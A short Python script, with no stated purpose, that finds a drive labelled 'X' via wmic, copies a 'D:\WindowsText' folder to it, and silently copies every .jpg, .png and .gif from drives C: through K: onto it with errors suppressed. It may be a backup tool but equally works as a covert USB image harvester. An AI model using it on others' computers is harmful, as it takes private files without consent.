import shutil
import os
import subprocess
import multiprocessing
import scandir
def copy_files(source_dir, target_dir):
    for dirpath, dirnames, filenames in scandir.walk(source_dir):
        for file_name in filenames:
            ext = os.path.splitext(file_name)[1]
            if ext in ['.jpg', '.png', '.gif']:
                source_file = os.path.join(dirpath, file_name)
                target_file = os.path.join(target_dir, file_name)
                try:
                    shutil.copyfile(source_file, target_file)
                except:
                    pass

if __name__ == '__main__':
    multiprocessing.freeze_support()
    target_name = 'X'  
    new_folder_name = 'photos'  
    command = 'wmic logicaldisk where volumename="{}" get caption'.format(target_name)
    result = subprocess.check_output(command, shell=True).decode('utf-8').strip()
    target_dir = result.split('\r\n')[1].strip()  
    if not target_dir:
        print(f"error")
        exit()
    new_folder_path = os.path.join(target_dir, new_folder_name)  
    os.makedirs(new_folder_path, exist_ok=True)  
    if os.path.exists('D:\\WindowsText'): 
        sourcedir = 'D:\\WindowsText'
        try:
            target_dirs = os.path.join(new_folder_path, 'WindowsText')
            shutil.copytree(sourcedir, target_dirs)
        except:
            pass
    source_dirs = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\'] 
    processes = []
    targetdir=os.path.abspath(target_dir) 
    for source_dir in source_dirs:
        if source_dir != targetdir:
            p = multiprocessing.Process(target=copy_files, args=(source_dir, new_folder_path))
            processes.append(p)
            p.start()
    for p in processes:
        p.join()
